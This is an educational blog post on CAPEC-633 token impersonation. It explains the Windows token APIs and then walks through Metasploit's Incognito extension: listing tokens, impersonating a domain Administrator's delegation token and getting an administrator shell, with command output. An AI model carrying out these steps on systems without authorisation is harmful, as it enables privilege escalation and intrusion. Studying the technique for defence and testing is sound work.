---
title: CAPEC 633 - Token Impersonation
categories: [Ethical Hacking, CAPEC]
tag: [privilege escalation (TA0004), metasploit, meterpreter]
comments: true
---

## Overview

An adversary exploits a weakness in authentication to create an access token (or equivalent) that impersonates a different entity, and then associates a process/thread to that that impersonated token. This action causes a downstream user to make a decision or take action that is based on the assumed identity, and not the response that blocks the adversary. [^1]

Adversaries may duplicate then impersonate another user's token to escalate privileges and bypass access controls. An adversary can create a new access token that duplicates an existing token using `DuplicateToken(Ex)`. The token can then be used with `ImpersonateLoggedOnUser` to allow the calling thread to impersonate a logged on user's security context, or with `SetThreadToken` to assign the impersonated token to a thread.

An adversary may do this when they have a specific, existing process they want to assign the new token to. For example, this may be useful for when the target user has a non-network logon session on the system. [^2]

There are two types of Tokens of interest:

- **Delegate:** Interactive access to hosts
- **Impersonate:** Non-interactive access to hosts

## Steps to Interface with Tokens

Metasploits Meterpreter has a built-in extension named Incognito that allows an attacker to interface with tokens on a compromised host. Once you have a Meterpreter session, you can impersonate valid tokens on the system and become that specific user without ever having to worry about credentials, or for that matter, even hashes. [^3]

```bash
(meterpreter) > load incognito
(meterpreter) > help

    Incognito Commands
    ==================

        Command              Description                                             
        -------              -----------                                             
        add_group_user       Attempt to add a user to a global group with all tokens 
        add_localgroup_user  Attempt to add a user to a local group with all tokens  
        add_user             Attempt to add a user with all tokens                   
        impersonate_token    Impersonate specified token                             
        list_tokens          List tokens available under current user context        
        snarf_hashes         Snarf challenge/response hashes for every token 
```

1. **Identifying Tokens:** The below example shows to the command to run to list all delegation and impersonation tokens on the target host. Of note is the Administrator delegation token.

    ```bash
    (meterpreter) > list_tokens -u

        Delegation Tokens Available
        ========================================
        Font Driver Host\UMFD-0
        Font Driver Host\UMFD-1
        NT AUTHORITY\LOCAL SERVICE
        NT AUTHORITY\NETWORK SERVICE
        NT AUTHORITY\SYSTEM
        darkcybe\Administrator
        Window Manager\DWM-1

        Impersonation Tokens Available
        ========================================
        No tokens available
    ```

2. **Token Impersonation:** When issuing the below command to perform the token impersonation using the previously identified Administrator delegate token, proceeding commands will be executed under that account.

    ```bash
    (meterpreter) > impersonate_token darkcybe\\Administrator

        [+] Delegation token available
        [+] Successfully impersonated user darkcybe\Administrator
    ```

3. **Command Execution:** With the Administrator account now being impersonated using the delegation token, commands can be run using the meterpreter shell. Running `execute -f cmd.exe -i -t` from within Meterpreter executes cmd.exe, the `-i` allows us to interact with the victims PC, and the `-t` assumes the role we just impersonated through incognito.

    ```bash
    (meterpreter) > shell

        Process 1676 created.
        Channel 1 created.
        Microsoft Windows [Version 10.0.22623.870]
        (C) Microsoft Corporation. All rights reserved.

        C:\WINDOWS\system32> whoami
        whoami
        darkcybe\administrator
    ```

## Sources

[^1]: [CAPEC-633: Token Impersonation](https://capec.mitre.org/data/definitions/633.html)
[^2]: [MITRE ATT&CK - Access Token Manipulation: Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001/)
[^3]: [Offensive Security - FUN WITH INCOGNITO](https://www.offensive-security.com/metasploit-unleashed/fun-incognito/)
